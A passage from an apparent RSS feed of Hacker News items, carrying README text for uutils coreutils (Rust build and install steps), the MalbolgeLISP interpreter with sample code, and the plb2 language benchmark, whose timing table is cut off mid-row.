<div id="readability-page-1" class="page"><p dir="auto">uutils coreutils is a cross-platform reimplementation of the GNU coreutils in
<a href="http://www.rust-lang.org/" rel="nofollow">Rust</a>. While all programs have been implemented, some
options might be missing or different behavior might be experienced.</p><p dir="auto">uutils aims to be a drop-in replacement for the GNU utils. Differences with GNU
are treated as bugs.</p><p dir="auto">uutils aims to work on as many platforms as possible, to be able to use the same
utils on Linux, Mac, Windows and other platforms. This ensures, for example,
that scripts can be easily transferred between platforms.</p><div dir="auto">
<h2 tabindex="-1" dir="auto">Documentation</h2>
<p dir="auto">uutils has both user and developer documentation available:</p>
<ul dir="auto">
<li><a href="https://uutils.github.io/coreutils/book/" rel="nofollow">User Manual</a></li>
<li><a href="https://uutils.github.io/dev/coreutils/" rel="nofollow">Developer Documentation</a> (currently offline, you can use docs.rs in the meantime)</li>
</ul>
<p dir="auto">Both can also be generated locally, the instructions for that can be found in
the <a href="https://github.com/uutils/uutils.github.io">coreutils docs</a> repository.</p>

<h2 tabindex="-1" dir="auto">Requirements</h2>
<ul dir="auto">
<li>Rust (<code>cargo</code>, <code>rustc</code>)</li>
<li>GNU Make (optional)</li>
</ul>
<h3 tabindex="-1" dir="auto">Rust Version</h3>
<p dir="auto">uutils follows Rust's release channels and is tested against stable, beta and
nightly. The current Minimum Supported Rust Version (MSRV) is <code>1.70.0</code>.</p>
<h2 tabindex="-1" dir="auto">Building</h2>
<p dir="auto">There are currently two methods to build the uutils binaries: either Cargo or
GNU Make.</p>
<blockquote>
<p dir="auto">Building the full package, including all documentation, requires both Cargo
and Gnu Make on a Unix platform.</p>
</blockquote>
<p dir="auto">For either method, we first need to fetch the repository:</p>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/uutils/coreutils
cd coreutils"><pre>git clone https://github.com/uutils/coreutils
<span>cd</span> coreutils</pre></div>
<h3 tabindex="-1" dir="auto">Cargo</h3>
<p dir="auto">Building uutils using Cargo is easy because the process is the same as for every
other Rust program:</p>

<p dir="auto">This command builds the most portable common core set of uutils into a multicall
(BusyBox-type) binary, named 'coreutils', on most Rust-supported platforms.</p>
<p dir="auto">Additional platform-specific uutils are often available. Building these expanded
sets of uutils for a platform (on that platform) is as simple as specifying it
as a feature:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo build --release --features macos
# or ...
cargo build --release --features windows
# or ...
cargo build --release --features unix"><pre>cargo build --release --features macos
<span><span>#</span> or ...</span>
cargo build --release --features windows
<span><span>#</span> or ...</span>
cargo build --release --features unix</pre></div>
<p dir="auto">If you don't want to build every utility available on your platform into the
final binary, you can also specify which ones you want to build manually. For
example:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo build --features &quot;base32 cat echo rm&quot; --no-default-features"><pre>cargo build --features <span><span>"</span>base32 cat echo rm<span>"</span></span> --no-default-features</pre></div>
<p dir="auto">If you don't want to build the multicall binary and would prefer to build the
utilities as individual binaries, that is also possible. Each utility is
contained in its own package within the main repository, named "uu_UTILNAME". To
build individual utilities, use cargo to build just the specific packages (using
the <code>--package</code> [aka <code>-p</code>] option). For example:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo build -p uu_base32 -p uu_cat -p uu_echo -p uu_rm"><pre>cargo build -p uu_base32 -p uu_cat -p uu_echo -p uu_rm</pre></div>
<h3 tabindex="-1" dir="auto">GNU Make</h3>
<p dir="auto">Building using <code>make</code> is a simple process as well.</p>
<p dir="auto">To simply build all available utilities:</p>

<p dir="auto">In release mode:</p>

<p dir="auto">To build all but a few of the available utilities:</p>
<div dir="auto" data-snippet-clipboard-copy-content="make SKIP_UTILS='UTILITY_1 UTILITY_2'"><pre>make SKIP_UTILS=<span><span>'</span>UTILITY_1 UTILITY_2<span>'</span></span></pre></div>
<p dir="auto">To build only a few of the available utilities:</p>
<div dir="auto" data-snippet-clipboard-copy-content="make UTILS='UTILITY_1 UTILITY_2'"><pre>make UTILS=<span><span>'</span>UTILITY_1 UTILITY_2<span>'</span></span></pre></div>
<h2 tabindex="-1" dir="auto">Installation</h2>
<h3 tabindex="-1" dir="auto">Install with Cargo</h3>
<p dir="auto">Likewise, installing can simply be done using:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo install --path . --locked"><pre>cargo install --path <span>.</span> --locked</pre></div>
<p dir="auto">This command will install uutils into Cargo's <em>bin</em> folder (<em>e.g.</em>
<code>$HOME/.cargo/bin</code>).</p>
<p dir="auto">This does not install files necessary for shell completion or manpages. For
manpages or shell completion to work, use <code>GNU Make</code> or see
<code>Manually install shell completions</code>/<code>Manually install manpages</code>.</p>
<h3 tabindex="-1" dir="auto">Install with GNU Make</h3>
<p dir="auto">To install all available utilities:</p>

<p dir="auto">To install using <code>sudo</code> switch <code>-E</code> must be used:</p>

<p dir="auto">To install all but a few of the available utilities:</p>
<div dir="auto" data-snippet-clipboard-copy-content="make SKIP_UTILS='UTILITY_1 UTILITY_2' install"><pre>make SKIP_UTILS=<span><span>'</span>UTILITY_1 UTILITY_2<span>'</span></span> install</pre></div>
<p dir="auto">To install only a few of the available utilities:</p>
<div dir="auto" data-snippet-clipboard-copy-content="make UTILS='UTILITY_1 UTILITY_2' install"><pre>make UTILS=<span><span>'</span>UTILITY_1 UTILITY_2<span>'</span></span> install</pre></div>
<p dir="auto">To install every program with a prefix (e.g. uu-echo uu-cat):</p>
<div dir="auto" data-snippet-clipboard-copy-content="make PROG_PREFIX=PREFIX_GOES_HERE install"><pre>make PROG_PREFIX=PREFIX_GOES_HERE install</pre></div>
<p dir="auto">To install the multicall binary:</p>

<p dir="auto">Set install parent directory (default value is /usr/local):</p>
<div dir="auto" data-snippet-clipboard-copy-content="# DESTDIR is also supported
make PREFIX=/my/path install"><pre><span><span>#</span> DESTDIR is also supported</span>
make PREFIX=/my/path install</pre></div>
<p dir="auto">Installing with <code>make</code> installs shell completions for all installed utilities
for <code>bash</code>, <code>fish</code> and <code>zsh</code>. Completions for <code>elvish</code> and <code>powershell</code> can also
be generated; See <code>Manually install shell completions</code>.</p>
<h3 tabindex="-1" dir="auto">Manually install shell completions</h3>
<p dir="auto">The <code>coreutils</code> binary can generate completions for the <code>bash</code>, <code>elvish</code>,
<code>fish</code>, <code>powershell</code> and <code>zsh</code> shells. It prints the result to stdout.</p>
<p dir="auto">The syntax is:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo run completion <utility> <shell>"><pre>cargo run completion <span>&lt;</span>utility<span>&gt;</span> <span>&lt;</span>shell<span>&gt;</span></pre></div>
<p dir="auto">So, to install completions for <code>ls</code> on <code>bash</code> to
<code>/usr/local/share/bash-completion/completions/ls</code>, run:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo run completion ls bash > /usr/local/share/bash-completion/completions/ls"><pre>cargo run completion ls bash <span>&gt;</span> /usr/local/share/bash-completion/completions/ls</pre></div>
<h3 tabindex="-1" dir="auto">Manually install manpages</h3>
<p dir="auto">To generate manpages, the syntax is:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo run manpage <utility>"><pre>cargo run manpage <span>&lt;</span>utility<span>&gt;</span></pre></div>
<p dir="auto">So, to install the manpage for <code>ls</code> to <code>/usr/local/share/man/man1/ls.1</code> run:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo run manpage ls > /usr/local/share/man/man1/ls.1"><pre>cargo run manpage ls <span>&gt;</span> /usr/local/share/man/man1/ls.1</pre></div>
<h2 tabindex="-1" dir="auto">Un-installation</h2>
<p dir="auto">Un-installation differs depending on how you have installed uutils. If you used
Cargo to install, use Cargo to uninstall. If you used GNU Make to install, use
Make to uninstall.</p>
<h3 tabindex="-1" dir="auto">Uninstall with Cargo</h3>
<p dir="auto">To uninstall uutils:</p>

<h3 tabindex="-1" dir="auto">Uninstall with GNU Make</h3>
<p dir="auto">To uninstall all utilities:</p>

<p dir="auto">To uninstall every program with a set prefix:</p>
<div dir="auto" data-snippet-clipboard-copy-content="make PROG_PREFIX=PREFIX_GOES_HERE uninstall"><pre>make PROG_PREFIX=PREFIX_GOES_HERE uninstall</pre></div>
<p dir="auto">To uninstall the multicall binary:</p>
<div dir="auto" data-snippet-clipboard-copy-content="make MULTICALL=y uninstall"><pre>make MULTICALL=y uninstall</pre></div>
<p dir="auto">To uninstall from a custom parent directory:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# DESTDIR is also supported
make PREFIX=/my/path uninstall"><pre><span><span>#</span> DESTDIR is also supported</span>
make PREFIX=/my/path uninstall</pre></div>

<h2 tabindex="-1" dir="auto">GNU test suite compatibility</h2>
<p dir="auto">Below is the evolution of how many GNU tests uutils passes. A more detailed
breakdown of the GNU test results of the main branch can be found
<a href="https://uutils.github.io/coreutils/book/test_coverage.html" rel="nofollow">in the user manual</a>.</p>
<p dir="auto">See <a href="https://github.com/orgs/uutils/projects/1">https://github.com/orgs/uutils/projects/1</a> for the main meta bugs
(many are missing).</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/uutils/coreutils-tracking/blob/main/gnu-results.png?raw=true"><img src="https://github.com/uutils/coreutils-tracking/raw/main/gnu-results.png?raw=true" alt="Evolution over time"></a></p>
</div><p dir="auto">GNU Coreutils is licensed under the GPL 3.0 or later.</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A lightweight Lisp interpreter in Malbolge (106 pts)]]></title>
            <link>https://github.com/kspalaiologos/malbolge-lisp</link>
            <guid>38850961</guid>
            <pubDate>Wed, 03 Jan 2024 05:08:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/kspalaiologos/malbolge-lisp">https://github.com/kspalaiologos/malbolge-lisp</a>, See on <a href="https://news.ycombinator.com/item?id=38850961">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">MalbolgeLISP v1.2</h2>
<p dir="auto">Made by Palaiologos, 2020 - 2021. Core (core.mb) to the public domain, the entire program is governed by the GNU GPLv3 license.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/kspalaiologos/malbolge-lisp/raw/master/session.gif"><img src="https://github.com/kspalaiologos/malbolge-lisp/raw/master/session.gif" alt="Session gif" data-animated-image=""></a></p>
<p dir="auto"><strong><a href="https://github.com/kspalaiologos/malbolge-lisp/raw/master/MalbolgeLisp.pdf">During summer and fall of 2021, I wrote a book about MalbolgeLISP's design and implementation</a></strong></p>
<h2 tabindex="-1" dir="auto">What is MalbolgeLisp?</h2>
<p dir="auto"><strong>MalbolgeLisp</strong> is a LISP interpreter written in Malbolge. It's as of 2020 and 2021, <a href="https://en.wikipedia.org/wiki/Malbolge#Programming_in_Malbolge" rel="nofollow">the most advanced, usable Malbolge program ever created</a>. It supports everything LISPs generally tend to support (like <code>cond</code>, <code>let</code>, <code>lambda</code>, etc...). The v1.2 release greatly improved the performance and reduced the code size, while adding a few features.</p>
<p dir="auto"><strong>MalbolgeLISP</strong> supports tacit programming, partial application, de Bruijn indices, monad lifting, and more.</p>
<p dir="auto">A few fibonacci functions programmed in MalbolgeLISP (and tested on <code>(fibN 6)</code>):</p>
<div dir="auto" data-snippet-clipboard-copy-content="; Naive attempt at 1m 19s
(defun fib1 (n) (
    if [n < 2]
        n
        [(fib1 [n - 1]) + (fib1 [n - 2])]))

; Direct port of accumulator-keeping solution at 1m 6s:
(defun fib2 (n) ((lambda (a w) (
    if [w = 0]
        (#0 a)
        ((bruijn 0) (tie (#1 a) (lift + a)) [w - 1]))) '(0 1) n))

; A more idiomatic solution than the above at 54s:
(defun fib3 (n) ((lambda (x y w) (
    if [w = 0]
        x
        ((bruijn 0) y [x + y] [w - 1]))) 0 1 n))

; Iterative attempt at 43s
(defun fib4 (n) (#0 (
    iterateN n (lambda (x) (
        tie (#1 x) [(#0 x) + (#1 x)])) '(0 1))))"><pre><span><span>;</span> Naive attempt at 1m 19s</span>
(<span>defun</span> <span>fib1</span> (n) (
    <span>if</span> [n &lt; <span>2</span>]
        n
        [(fib1 [n - <span>1</span>]) + (fib1 [n - <span>2</span>])]))

<span><span>;</span> Direct port of accumulator-keeping solution at 1m 6s:</span>
(<span>defun</span> <span>fib2</span> (n) ((<span>lambda</span> (a w) (
    <span>if</span> [w = <span>0</span>]
        (<span>#0</span> a)
        ((bruijn <span>0</span>) (tie (<span>#1</span> a) (lift + a)) [w - <span>1</span>]))) '(<span>0</span> <span>1</span>) n))

<span><span>;</span> A more idiomatic solution than the above at 54s:</span>
(<span>defun</span> <span>fib3</span> (n) ((<span>lambda</span> (x y w) (
    <span>if</span> [w = <span>0</span>]
        x
        ((bruijn <span>0</span>) y [x + y] [w - <span>1</span>]))) <span>0</span> <span>1</span> n))

<span><span>;</span> Iterative attempt at 43s</span>
(<span>defun</span> <span>fib4</span> (n) (<span>#0</span> (
    iterateN n (<span>lambda</span> (x) (
        tie (<span>#1</span> x) [(<span>#0</span> x) + (<span>#1</span> x)])) '(<span>0</span> <span>1</span>))))</pre></div>
<h2 tabindex="-1" dir="auto">What is Malbolge? Why is it difficult?</h2>
<p dir="auto"><strong>Malbolge</strong> is a public domain esoteric programming language. It was specifically designed to be almost impossible to use, via a counter-intuitive 'crazy operation', trinary arithmetic, and self-modifying code. It builds on the difficulty of earlier, challenging esoteric languages like Brainfuck, but takes this aspect to the extreme. Despite this design, it is possible to write useful Malbolge programs (as this project proves).</p>
<p dir="auto">What Malbolge instructions do depends on their position in the source code. After being ran, they are encrypted (so to make a loop, one has to decrypt it after each iteration - sounds hard already?). This is how so-called instruction cycles have been discovered - it has been observed that some instructions on certain locations form looping cycles, which is the basis of Malbolge programming.</p>
<p dir="auto">The most complex programs made in Malbolge, to date, include an adder, a "99 bottles of beer" program, and a "Hello, world!" program (originally generated by a Lisp program utilizing a genetic algorithm).</p>
<p dir="auto">MalbolgeLisp uses a special variant of Malbolge called <strong>Malbolge Unshackled</strong>. It's considerably harder to program for multiple reasons:</p>
<ol dir="auto">
<li>The rotation width is chosen randomly by the interpreter</li>
<li>Malbolge Unshackled lets the width of rotation be variable, which grows with the values in the D register, and since the initial rotation width is unknown, you have to probe it (because otherwise <code>*</code> returns unpredictable results)</li>
<li>Malbolge Unshackled's print instruction requires unicode codepoints</li>
<li>if the rotation width is unknown then you can't load values larger than 3^4-1, except values starting with a <code>1</code> trit</li>
<li>to overcome this you need a loop that probes the rotation width which is probably beyond most people's comprehension</li>
<li>the specification says that the value <code>0t21</code> should be used to print a newline, but this value is <em>theoretically</em> impossible to obtain without having read an end of line or end of file from I/O before.</li>
<li>Malbolge Unshackled is actually usable because it's (as this project proves) Turing complete. The default Malbolge rotation width (10) constraints the addressable memory enough to make something cool with it.</li>
</ol>
<p dir="auto">A few example Malbolge programs:</p>
<p dir="auto">A "Hello World" program:</p>
<div data-snippet-clipboard-copy-content="(=<`#9]~6ZY327Uv4-QsqpMn&amp;+Ij&quot;'E%e{Ab~w=_:]Kw%o44Uqp0/Q?xNvL:`H%c#DD2^WV>gY;dts76qKJImZkj"><pre><code>(=&lt;`#9]~6ZY327Uv4-QsqpMn&amp;+Ij"'E%e{Ab~w=_:]Kw%o44Uqp0/Q?xNvL:`H%c#DD2^WV&gt;gY;dts76qKJImZkj
</code></pre></div>
<p dir="auto">A cat program that doesn't terminate on EOF:</p>
<div data-snippet-clipboard-copy-content="(=BA#9&quot;=<;:3y7x54-21q/p-,+*)&quot;!h%B0/.~P<<:(8&amp;66#&quot;!~}|{zyxwvugJk"><pre><code>(=BA#9"=&lt;;:3y7x54-21q/p-,+*)"!h%B0/.~P&lt;&lt;:(8&amp;66#"!~}|{zyxwvugJk
</code></pre></div>
<h2 tabindex="-1" dir="auto">How to use</h2>
<div data-snippet-clipboard-copy-content="$ git clone https://github.com/kspalaiologos/malbolge-lisp
$ cd malbolge-lisp
$ unzip lisp.mb
$ clang -O3 -march=native fast20.c -o fast20
$ cat init_module.mb core.mb > lisp.mb
$ ./fast20 lisp.mb"><pre><code>$ git clone https://github.com/kspalaiologos/malbolge-lisp
$ cd malbolge-lisp
$ unzip lisp.mb
$ clang -O3 -march=native fast20.c -o fast20
$ cat init_module.mb core.mb &gt; lisp.mb
$ ./fast20 lisp.mb
</code></pre></div>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Benchmarking 20 programming languages on N-queens and matrix multiplication (150 pts)]]></title>
            <link>https://github.com/attractivechaos/plb2</link>
            <guid>38850651</guid>
            <pubDate>Wed, 03 Jan 2024 04:13:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/attractivechaos/plb2">https://github.com/attractivechaos/plb2</a>, See on <a href="https://news.ycombinator.com/item?id=38850651">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><p dir="auto"><strong>TL;DR</strong>: see the figure below. Note that nqueen and matmul are implemented in
all languages but sudoku and bedcov are only implemented in some.
NB: nqueen and matmul in V have been updated in the <a href="#table">table</a>, but the
figure is not in sync yet. Now V is the fastest on nqueen+matmul.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/attractivechaos/plb2/blob/master/analysis/rst-m1.png"><img src="https://github.com/attractivechaos/plb2/raw/master/analysis/rst-m1.png"></a></p>
<h2 tabindex="-1" dir="auto">Table of Contents</h2>
<ul dir="auto">
<li><a href="#intro">Introduction</a></li>
<li><a href="#result">Results</a>
<ul dir="auto">
<li><a href="#overall">Overall impressions</a></li>
<li><a href="#caveat">Caveats</a>
<ul dir="auto">
<li><a href="#startup">Startup time</a></li>
<li><a href="#cputime">Elapsed time vs CPU time</a></li>
</ul>
</li>
<li><a href="#opt">Subtle optimizations</a>
<ul dir="auto">
<li><a href="#matmul">Optimizing inner loops</a></li>
<li><a href="#memlayout">Controlling memory layout</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#conclusion">Discussions</a></li>
<li><a href="#table">Appendix: Timing on Apple M1 Macbook Pro</a></li>
</ul>
<h2 tabindex="-1" dir="auto"><a name="user-content-intro"></a>Introduction</h2>
<p dir="auto">Programming Language Benchmark v2 (plb2) evaluates the performance of 20
programming languages on four CPU-intensive tasks. It is a follow-up to
<a href="https://github.com/attractivechaos/plb">plb</a> conducted in 2011. In plb2, all implementations use the same
algorithm for each task and their performance bottlenecks do not fall in
library functions. We do not intend to compare different algorithms or the
quality of the standard libraries in these languages. Plb2 is supposed to
demonstrate the performance of a language when you have to implement a new
algorithm in the language, which may happen if you can't find the algorithm in
existing libraries.</p>
<p dir="auto">The four tasks in plb2 all take a few seconds for a fast implementation to
complete. The tasks are:</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>nqueen</strong>: solving a <a href="https://en.wikipedia.org/wiki/Eight_queens_puzzle" rel="nofollow">15-queens problem</a>. The algorithm was inspired
by the second C implementation <a href="https://rosettacode.org/wiki/N-queens_problem#C" rel="nofollow">from Rosetta Code</a>. It involves nested
loops and integer bit operations.</p>
</li>
<li>
<p dir="auto"><strong>matmul</strong>: multiplying two square matrices of 1500x1500 in size. The inner
loop resembles BLAS' <a href="https://en.wikipedia.org/wiki/Basic_Linear_Algebra_Subprograms#Level_1" rel="nofollow">axpy</a> operation.</p>
</li>
<li>
<p dir="auto"><strong>sudoku</strong>: solving 4000 hard <a href="https://en.wikipedia.org/wiki/Sudoku" rel="nofollow">Sudokus</a> (20 puzzles repeated for 200
times) using the <a href="https://attractivechaos.github.io/plb/kudoku.html" rel="nofollow">kudoku algorithm</a>. This algorithm heavily uses
small fixed-sized arrays with a bit complex logic.</p>
</li>
<li>
<p dir="auto"><strong>bedcov</strong>: finding the overlaps between two arrays of 1,000,000 intervals
with <a href="https://academic.oup.com/bioinformatics/article/37/9/1315/5910546" rel="nofollow">implicit interval trees</a>. The algorithm involves frequent
array access in a pattern similar to binary searches.</p>
</li>
</ul>
<p dir="auto">Every language has nqueen and matmul implementations. Some languages do not
have sudoku or bedcov implementations. In addition, I implemented most
algorithms in plb2 and adapted a few contributed matmul and sudoku
implementations in plb. As I am mostly a C programmer, implementations in other
languages may be suboptimal and there are no implementations in functional
languages. <strong>Pull requests are welcomed!</strong></p>
<h2 tabindex="-1" dir="auto"><a name="user-content-result"></a>Results</h2>
<p dir="auto">The figure at the top of the page summarizes the elapsed time of each implementation
measured on an Apple M1 MacBook Pro. <a href="https://github.com/sharkdp/hyperfine">Hyperfine</a> was used for timing
except for a few slow implementations which were timed with the "time" bash
command without repetition. A plus sign "+" indicates an explicit compilation
step. Exact timing can be found in the <a href="#table">table below</a>. The figure was
programmatically generated from the table but may be outdated.</p>
<h3 tabindex="-1" dir="auto"><a name="user-content-overall"></a>Overall impression</h3>
<p dir="auto">Programming language implementations in plb2 can be classified into four groups
depending on how and when compilation is done:</p>
<ol dir="auto">
<li>
<p dir="auto">Purely interpretted with no compilation (Perl and <a href="https://en.wikipedia.org/wiki/CPython" rel="nofollow">CPython</a>, the
official Python implementation). Not surprisingly, these are the slowest
language implementations in this benchmark.</p>
</li>
<li>
<p dir="auto">JIT compiled without a separate compilation step (Dart, all JavaScript
runtimes, Julia, LuaJIT, PHP, PyPy and Ruby3 with <a href="https://github.com/ruby/ruby/blob/master/doc/yjit/yjit.md">YJIT</a>). These
language implementations compile hot code on the fly and then execute. They
have to balance compilation time and running time to achieve the best
overall performance.</p>
<p dir="auto">In this group, although PHP and Ruby3 are faster than Perl and CPython, they
are still an order of magnitude slower than PyPy. The two JavaScript engines
(Bun and Node), Dart and Julia all perform well. They are about twice as
fast as PyPy.</p>
</li>
<li>
<p dir="auto">JIT compiled with a separate compilation step (Java and C#). With separate
compilation, Java and C# can afford to trade compilation time for running
time in theory, but in this benchmark, they are not obviously faster than
those in group 2.</p>
</li>
<li>
<p dir="auto"><a href="https://en.wikipedia.org/wiki/Ahead-of-time_compilation" rel="nofollow">Ahead-of-time compilation</a> (the rest). Optimizing binaries for
specific hardware, these compilers, except Swift, tend to generate the
fastest executables.</p>
</li>
</ol>
<h3 tabindex="-1" dir="auto"><a name="user-content-caveat"></a>Caveats</h3>
<h4 tabindex="-1" dir="auto"><a name="user-content-startup"></a>Startup time</h4>
<p dir="auto">Some JIT-based language runtimes take up to ~0.3 second to compile and warm-up.
We are not separating out this startup time. Nonetheless, because most
benchmarks run for several seconds, including the startup time does not greatly
affect the results.</p>
<h4 tabindex="-1" dir="auto"><a name="user-content-cputime"></a>Elapsed time vs CPU time</h4>
<p dir="auto">Although no implementations use multithreading, language runtimes may be doing
extra work, such as garbage collection, in a separate thread. In this case, the
CPU time (user plus system) may be longer than elapsed wall-clock time. Julia,
in particular, takes noticeably more CPU time than wall-clock time even for the
simplest nqueen benchmark. In plb2, we are measuring the elapsed wall-clock
time because that is the number users often see. The ranking of CPU time may be
slightly different.</p>
<h3 tabindex="-1" dir="auto"><a name="user-content-opt"></a>Subtle optimizations</h3>
<h4 tabindex="-1" dir="auto"><a name="user-content-memlayout"></a>Controlling memory layout</h4>
<p dir="auto">When implementing bedcov in Julia, C and many compiled languages, it is
preferred to have an array of objects in a contiguous memory block such that
adjacent objects are close in memory. This helps cache efficiency. In most
scripting languages, unfortunately, we have to put references to objects in an
array at the cost of cache locality. The issue can be alleviated by cloning
objects to a new array. This doubles the speed of PyPy and Bun.</p>
<h4 tabindex="-1" dir="auto"><a name="user-content-matmul"></a>Optimizing inner loops</h4>
<p dir="auto">The bottleneck of matrix multiplication falls in the following nested loop:</p>
<div dir="auto" data-snippet-clipboard-copy-content="for (int i = 0; i < n; ++i)
    for (int k = 0; k < n; ++k)
        for (int j = 0; j < n; ++j)
            c[i][j] += a[i][k] * b[k][j];"><pre><span>for</span> (<span>int</span> i = <span>0</span>; i &lt; n; ++i)
    <span>for</span> (<span>int</span> k = <span>0</span>; k &lt; n; ++k)
        <span>for</span> (<span>int</span> j = <span>0</span>; j &lt; n; ++j)
            c[i][j] += a[i][k] * b[k][j];</pre></div>
<p dir="auto">It is obvious that <code>c[i]</code>, <code>b[k]</code> and <code>a[i][k]</code> can be moved out of the inner
loop to reduce the frequency of matrix access. The Clang compiler can apply
this optimization. Manual optimization may actually hurt performance.</p>
<p dir="auto">However, <strong>most other languages cannot optimize this nested loop.</strong> If we
manually move <code>a[i][k]</code> to the loop above it, we can often improve their
performance. Some C/C++ programmers say compilers often optimize better than
human, but this might not be the case in other languages.</p>
<h2 tabindex="-1" dir="auto"><a name="user-content-conclusion"></a>Discussions</h2>
<p dir="auto">The most well-known and the longest running language benchmark is the <a href="https://benchmarksgame-team.pages.debian.net/benchmarksgame/index.html" rel="nofollow">Computer
Language Benchmark Games</a>. Plb2 differs in that it includes more recent
languages (e.g. Nim and Crystal), more language runtimes (e.g. PyPy and
LuaJIT) and more tasks (all four tasks are new), and it comes with more uniform
implementations and focuses more on the performance of the language itself
without library functions. <strong>Plb2 complements the Computer Language Benchmark
Games.</strong></p>
<p dir="auto">One important area that plb2 does not evaluate is the performance of memory
allocation and/or garbage collection. This may contribute more to practical
performance than generating machine code. Nonetheless, it is challenging to
design a realistic micro-benchmark to evaluate memory allocation. If the
built-in allocator in a language implementation does not work well, we can
implement customized memory allocator just for the specific task but this, in
my view, would not represent typical use cases.</p>
<p dir="auto">When plb was conducted in 2011, half of the languages in the figure above were
not mature or even did not exist. It is exciting to see many of them have
reached the 1.0 milestone and are gaining popularity among modern programmers.
On the other hand, Python remains one of the two most used scripting languages
despite its poor performance. In my view, this is because PyPy would not be
officially endorsed while other JIT-based languages are not general or good
enough. Will there be a language to displace Python in the next decade? I am
not optimistic.</p>
<h2 tabindex="-1" dir="auto"><a name="user-content-table"></a>Appendix: Timing on Apple M1 Macbook Pro</h2>
<table>
<thead>
<tr>
<th>Label</th>
<th>Language</th>
<th>Runtime</th>
<th>Version</th>
<th>nqueen</th>
<th>matmul</th>
<th>sudoku</th>
<th>bedcov</th>
</tr>
</thead>
<tbody>
<tr>
<td>c:clang+</td>
<td>C</td>
<td>Clang</td>
<td>15.0.0</td>
<td>2.70</td>
<td>0.54</td>
<td>1.54</td>
<td>0.84</td>
</tr>
<tr>
<td>crystal+</td>
<td>Crystal</td>
<td></td>
<td>1.10.0</td>
<td>3.28</td>
<td>2.45</td>
<td></td>
<td>0.87</td>
</tr>
<tr>
<td>c#:.net+</td>
<td>C#</td>
<td>.NET</td>
<td>8.0.100</td>
<td>3.00</td>
<td>4.67</td>
<td>3.01</td>
<td></td>
</tr>
<tr>
<td>d:ldc2+</td>
<td>D</td>
<td>LDC2</td>
<td>2.105.2</td>
<td>2.68</td>
<td>0.57</td>
<td>1.60</td>
<td></td>
</tr>
<tr>
<td>dart</td>
<td>Dart</td>
<td>(JIT)</td>
<td>3.2.4</td>
<td>3.62</td>
<td>4.81</td>
<td>3.24</td>
<td></td>
</tr>
<tr>
<td>go+</td>
<td>Go</td>
<td></td>
<td>1.21.5</td>
<td>2.94</td>
<td>1.63</td>
<td>2.04</td>
<td></td>
</tr>
<tr>
<td>java+</td>
<td>Java</td>
<td>OpenJDK</td>
<td>20.0.1</td>
<td>3.92</td>
<td>1.14</td>
<td>3.20</td>
<td></td>
</tr>
<tr>
<td>js:bun</td>
<td>JavaScript</td>
<td>Bun</td>
<td>1.0.20</td>
<td>3.11</td>
<td>1.75</td>
<td>3.07</td>
<td>2.83</td>
</tr>
<tr>
<td>js:deno</td>
<td>JavaScript</td>
<td>Deno</td>
<td>1.39.1</td>
<td>4.00</td>
<td>3.06</td>
<td>4.04</td>
<td>3.87</td>
</tr>
<tr>
<td>js:k8</td>
<td>JavaScript</td>
<td>k8</td>
<td>1.0</td>
<td>3.79</td>
<td>2.99</td>
<td>3.76</td>
<td>4.02</td>
</tr>
<tr>
<td>js:node</td>
<td>JavaScript</td>
<td>Node</td>
<td>21.5.0</td>
<td>3.73</td>
<td>2.88</td>
<td>3.77</td>
<td>3.83</td>
</tr>
<tr>
<td>julia</td>
<td>Julia</td>
<td></td>
<td>1.10.0</td>
<td>3.75</td>
<td>0.76</td>
<td>2.72</td>
<td>2.47</td>
</tr>
<tr>
<td>luajit</td>
<td>Lua</td>
<td>LuaJIT</td>
<td>2.1</td>
<td>5.31</td>
<td>2.66</td>
<td>4.48</td>
<td>10.59</td>
</tr>
<tr>
<td>mojo+</td>
<td>Mojo</td>
<td></td>
<td>0.6.1</td>
<td>3.24</td>
<td>1.12</td>
<td></td>
<td></td>
</tr>
<tr>
<td>nim+</td>
<td>Nim</td>
<td></td>
<td>2.0.2</td>
<td>3.18</td>
<td>0.69</td>
<td></td>
<td>1.18</td>
</tr>
<tr>
<td>perl</td>
<td>Perl</td>
<td></td>
<td>5.34.1</td>
<td>158.34</td>
<td>158.01</td>
<td>90.78</td>
<td></td>
</tr>
<tr>
<td>php</td>
<td>PHP</td>
<td></td>
<td>8.3</td>
<td>48.15</td>
<td>71.20</td>
<td></td>
<td></td>
</tr>
<tr>
<td>py:pypy</td>
<td>Python</td>
<td>Pypy</td>
<td>7.3.14</td>
<td>6.91</td>
<td>4.95</td>
<td>8.82</td>
<td>6.27</td>
</tr>
<tr>
<td>py:cpy</td>
<td>Python</td>
<td>CPython</td>
<td>3.11.7</td>
<td>159.97</td>
<td>223.66</td>
<td>52.88</td>
<td>42.84</td>
</tr>
<tr>
<td>ruby</td>
<td>Ruby</td>
<td>(YJIT)</td>
<td>3.3.0</td>
<td>88.15</td>
<td>130.51</td>
<td>52.26</td>
<td></td>
</tr>
<tr>
<td>rust+</td>
<td>Rust</td>
<td></td>
<td>1.75.0</td>
<td>2.68</td>
<td>0.56</td>
<td>1.65</td>
<td></td>
</tr>
<tr>
<td>swift+</td>
<td>Swift</td>
<td></td>
<td>5.9.0</td>
<td>2.92</td>
<td>7.46</td>
<td>16.02</td>
<td></td>
</tr>
<tr>
<td>v+</td>
<td>V</td>
<td></td>
